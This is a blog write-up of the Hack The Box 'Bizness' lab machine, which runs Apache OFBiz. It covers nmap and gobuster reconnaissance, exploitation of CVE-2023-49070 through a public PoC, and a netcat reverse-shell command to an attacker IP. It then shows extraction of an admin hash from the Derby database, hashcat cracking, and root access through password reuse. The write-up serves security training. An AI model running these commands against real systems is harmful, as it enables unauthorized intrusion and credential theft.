---
title: Hack the box Bizness pwned!
date: 2024-03-01 00:00:01 +0000
categories: [hack the box, machine]
tags: [hack the box, bizness, ofbiz, derby]
img_path: /assets/img/posts/
---

## Machine info

![Bizness info](htb-bizness-info.png)
*Bizness info*

## Annotations

>In this article we are going to assume the following ip addresses:
>
>Local machine (attacker, local host): 10.10.16.79
>
>Target machine (victim, Bizness): 10.10.11.252
{: .prompt-info}

## Enumeration

Let's go look for the open ports in the machine using `nmap`:

`sudo nmap -Pn -n -sS -p- --open -T5 --min-rate=5000 -oN nmap_initial.txt 10.10.11.252`

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
38657/tcp open  unknown
44495/tcp open  unknown
```

## Footprinting

We fine tune the scan to see if we can get more information about the running services:

`sudo nmap -Pn -n -sVC -p22,80,443,38657,44495 -oN nmap_versions.txt 10.10.11.252`

```
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
80/tcp    open   http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open   ssl/https  nginx/1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
38657/tcp closed unknown
44495/tcp open   tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that there is a web service running on port 80 pointing to `https://bizness.htb/`, so let's start there.
First of all, we add the machine address to our `/etc/hosts`:

`echo "https://bizness.htb/" | sudo tee -a /etc/hosts`

We browse to `https://bizness.htb/` to investigate the web:

![Bizness Incorporated web](htb-bizness-incorporated-web.png)
*Bizness incorporated web*

We can't do anything in the web, so we will fuzzing with `gobuster` to find hidden resources:

`gobuster dir -u https://bizness.htb -x php,txt,html -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -k -b 301,302,403,404 | tee gobuster.txt`

And, we find the following resources:

```
/index.html           (Status: 200) [Size: 27200]
/control              (Status: 200) [Size: 34633]
```

Under `/control` we have `/control/login`, so we browse to `https://bizness.htb/control/login` and we find the following form:

![OFBiz login](htb-bizness-ofbiz-login.png)
*Bizness login*

We can see the [OFBiz](https://github.com/apache/ofbiz-framework) logo. 
[OFBiz framework](https://github.com/apache/ofbiz-framework) is an Apache open source ERP (Enterprise resource planning) system.

If we look at the very bottom of the page, we can see the [OFBiz](https://github.com/apache/ofbiz-framework) version:

![Bizness version](htb-bizness-ofbiz-version.png)
*Bizness version*

It's running the 18.12 version.
The current version it's a 18.12.12, so could be a little outdated.
If we look for vulnerabilities for the [OFBiz](https://github.com/apache/ofbiz-framework) 18.12 version, we can see that there is the [CVE-2023-49070](https://nvd.nist.gov/vuln/detail/CVE-2023-49070) that allows an authentication bypass in versions <= 18.12.10:

[OFBIz CVE-2023-49070 in github](https://github.com/search?q=CVE-2023-49070&type=repositories)

Seems very convenient for us, so we download a PoC and we try our luck.

## Foothold

> I used [This PoC](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-exploit) from [@kjakaba](https://www.vicarius.io/vsociety/sign/in?back=/users/jakaba) (thanks for the work! ;)).
>
> To be able to execute the [@kjakaba](https://www.vicarius.io/vsociety/sign/in?back=/users/jakaba)'s exploit, we need the [ysoserial-all.jar](https://github.com/frohoff/ysoserial) package.
{: .prompt-info}

We open a `netcat` listening on our side:
`nc -lvnp 12345`

And now, we run the exploit:

`python3 ofbiz_exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.79 12345'`

> Seems that the PoCs that I tried don't work every time, and we may have to run it a few times, so be patient :P
{: .prompt-info}

And... We get shell!

### ofbiz

Fist of all, as always, it’s upgrading our tty:

```
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
reset xterm
export TERM=xterm-256color
stty rows 56 columns 209
```

Now, we can get our user flag:

`cat /home/ofbiz/user.txt`

Seems that we can't do anything else with our new user.
As [OFBiz](https://github.com/apache/ofbiz-framework) by default uses the embedded database `derby` let's take a look at its files, in the `opt/ofbiz/runtime/data/derby/ofbiz/` path.

In `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.data` we have the crentials of the `admin` user:

```
cat c54d0.dat| grep -i password
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
```

`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` is a SHA-1 hash with a salt. The salt is the character `d`, and the hashed value is `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`, besides `uP0_QaVBpDWFeo8-dRzDqRwXQ2I` is encoded in base64.

To crack this password, we need to decode `uP0_QaVBpDWFeo8-dRzDqRwXQ2I` from base64url to hex:

```
echo "uP0_QaVBpDWFeo8-dRzDqRwXQ2I" | tr '_-' '/+' | base64 -d 2>/dev/null | xxd -ps
b8fd3f41a541a435857a8f3e751cc3a91c174362
```

Now, we add the salt and store the string in the `hash.txt` file:

`echo -n "b8fd3f41a541a435857a8f3e751cc3a91c174362:d" > hash.txt`

And, now, we use hashcat to crack it:

`hashcat -a 0 -m 120 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`

After a while, we will have the password for the `admin` user.
So, we will try if it is reused for the `root` user:

`su`

It works!
And we can get our system flag:

`cat /root/root.txt`

![Bizness pwned](htb-bizness-pwned.png)
*Bizness has been Pwned*

*Enjoy! ;)*
